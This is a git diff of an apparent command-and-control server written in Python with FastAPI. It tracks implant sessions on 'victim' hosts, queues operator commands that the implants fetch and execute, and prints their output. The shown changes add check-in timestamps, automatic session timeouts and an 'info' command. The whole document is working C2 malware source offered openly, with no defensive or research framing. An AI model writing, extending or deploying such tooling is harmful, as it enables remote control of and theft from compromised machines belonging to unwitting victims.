@@ -8,23 +8,28 @@ import readline
 import threading
 import uvicorn
 from asargen import createAsarFile
-
+#import asyncio
+import time
+from datetime import datetime
 
 class SESSION:
     def __init__(self):
         self.data = {
             'ID': None,
             'Address': None,
-            'Platform': None
+            'Platform': None,
+            'Last-Check-In': None
         }
 
-    def set_info(self, ID=None, Address=None, Platform=None):
+    def set_info(self, ID=None, Address=None, Platform=None, LastCheckIn=None):
         if ID:
             self.data['ID'] = ID
         if Address:
             self.data['Address'] = Address
         if Platform:
             self.data['Platform'] = Platform
+        if LastCheckIn:
+            self.data['Last-Check-In'] = LastCheckIn
     
     def get_info(self, field):
         return self.data.get(field, "Field not found")
@@ -38,12 +43,24 @@ CMD_HISTORY: List[str] = []
 HISTORY_INDEX: int = -1
 CMD_QUEUE: List[str] = []
 PAUSE_CMDS: bool = False
-
+TIMEOUT = 30
 SESSIONS: List[SESSION] = []
 
 CURRENT_SESSION: str = "none"
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 app = FastAPI()
+#asyncio.create_task(checkTimeout())
 
 global_lock = True
 global_connection = False
@@ -84,16 +101,17 @@ outputRequests = [
 
 clients = []
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+def checkTimeout():
+    while True:
+        if len(SESSIONS) != 0:
+            for i, session in enumerate(SESSIONS):
+                if (time.time() - session.get_info('Last-Check-In')) > 30:
+                    print(f"\n{bcolors.FAIL}[!]{bcolors.ENDC} Session timeout: {session.get_info('ID')}.")
+                    client = clients.index(session.get_info('Address'))
+                    clients.pop(client)
+                    SESSIONS.pop(i)
+                    
+        time.sleep(5)
 
 def fancyprint(text: str):
     print("\r" + text + "\n$ ", end="")
@@ -117,7 +135,7 @@ def checkIfNewClient(client, sessionID, platform):
         clients.append(client)
         print(f"\n{bcolors.OKGREEN}[!]{bcolors.ENDC} New session: {sessionID}\n")
         session = SESSION()
-        session.set_info(ID=sessionID, Address=client, Platform=platform)
+        session.set_info(ID=sessionID, Address=client, Platform=platform, LastCheckIn=time.time())
         SESSIONS.append(session)
         
         global global_connection
@@ -160,9 +178,20 @@ async def get_command(path: str, request: Request):
 
     client = getIP(request)
 
+    for session in SESSIONS:
+        if client == session.get_info('Address'):
+            session.set_info(LastCheckIn=time.time())
+
     if path in cmdRequests and client == CURRENT_SESSION: 
+
+        
+        # if no command return no content
         if len(CMD_QUEUE) == 0:
             return "204 - No Content"
+
+        #set request event
+
+        #pop command from queue and return command to client
         cmd: str = CMD_QUEUE.pop(0)
         fancyprint(f"Running '{cmd}' on {client}...")
         CMD_HISTORY.append(cmd)
@@ -180,6 +209,8 @@ async def send_output(path: str, request: Request):
         else:
             fancyprint("Output:")
             fancyprint(data["result"])
+
+
 
 def encodeFile(filePath):
     with open(filePath, 'rb') as file:
@@ -242,6 +273,7 @@ def listSessions():
         print(f"\tSession ID: {session.get_info('ID')}")
         print(f"\tIP Address: {session.get_info('Address')}")
         print(f"\tPlatform: {session.get_info('Platform')}")
+        print(f"\tLast Check In: {datetime.fromtimestamp(session.get_info('Last-Check-In'))}")
         print("\n")
 
 def selectSession(choice):
@@ -326,6 +358,7 @@ def input_thread():
         #help
         if new_cmd == "help":
             print("""Run a command on the victim or
+    - use \"info\" to see information about the session.
     - use \"getpid\" to get the process ID of the implant.
     - use \"back\" to background the session.
     - use \"kill\" to kill the implant.
@@ -353,14 +386,19 @@ def input_thread():
             # You're welcome :)
             os.system(f"kill {os.getpid()}")
             while True: pass
-        #banner
-        elif new_cmd == "banner":
-            printHeader()
         elif new_cmd == "clear" or new_cmd == "cls":
             clearScreen()
         elif new_cmd.strip() == "back" or new_cmd.strip() == "background":
             print(f"Backgrounded Session: {sessionid}.")
             CURRENT_SESSION = "none"
+        elif new_cmd.strip() == "info":
+            for i, session in enumerate(SESSIONS):
+                if session.get_info('ID') == sessionid:
+                    print(f"Session {i}")
+                    print(f"ID: {session.get_info('ID')}")
+                    print(f"Address: {session.get_info('Address')}")
+                    print(f"Platform: {session.get_info('Platform')}")
+                    print(f"Last Check In: {datetime.fromtimestamp(session.get_info('Last-Check-In'))}")
         #execute command on victim
         elif new_cmd.strip() != "":
             CMD_QUEUE.append(new_cmd)
@@ -390,5 +428,6 @@ while portSet == False:
 print(f"Starting listener on port: {PORT}!")
 
 threading.Thread(target = input_thread).start()
+threading.Thread(target = checkTimeout).start()
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="critical", ssl_keyfile="TLS/key.pem", ssl_certfile="TLS/cert.pem") #start web server on current host (0.0.0.0) using the PORT variable
